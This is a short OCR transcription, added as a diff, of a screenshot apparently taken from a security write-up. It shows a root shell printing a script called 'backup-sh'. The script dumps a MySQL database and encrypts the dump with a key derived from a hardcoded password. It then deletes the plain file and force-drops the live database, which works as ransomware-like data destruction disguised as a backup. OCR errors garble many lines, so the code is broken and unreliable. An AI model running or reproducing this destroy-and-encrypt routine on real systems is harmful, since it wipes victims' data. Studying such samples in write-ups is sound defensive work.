@@ -1,0 +1,19 @@
+# OCR: b5e5b4f0582827a3c153a8d7a20ac785.jpg
+# 来源: .\02-WriteUp\2024\b5e5b4f0582827a3c153a8d7a20ac785.jpg
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-08-31 15:39
+
+[rootbans ~]# cat /root/backup-sh
+#1 /bin/bash
+DB_NAME="2828"
+BACKUP_PATH="/root/backup”
+cd $BACKUP_PATH
+DATE=$(date +%Y%mi&d%HIGMKS )
+AES_PASS=$(echo -n “$DB_NAME” | openssl enc -aes-256-cbc -a -salt -pass pass-mysecretpassuord -nosalt)
+BACKUP_FILE_NAMI
+${DB_NAME}_${DATE}_sql"
+nysqldump - $DB_USER -p$DB_PASSWORD $DB_NAME > $BACKUP_FILE NAME
+File_Name="§{DB_NAME}.sql.gz”
+tar -czvf - $BACKUP_FILE NAME | openssl des3 -salt -k SAES_PASS -out $File_Name
+rm -rf $BACKUP_FILE_NAME
+mysqladmin -u $DB_USER -p$DB_PASSWORD drop $DB_NAME --force
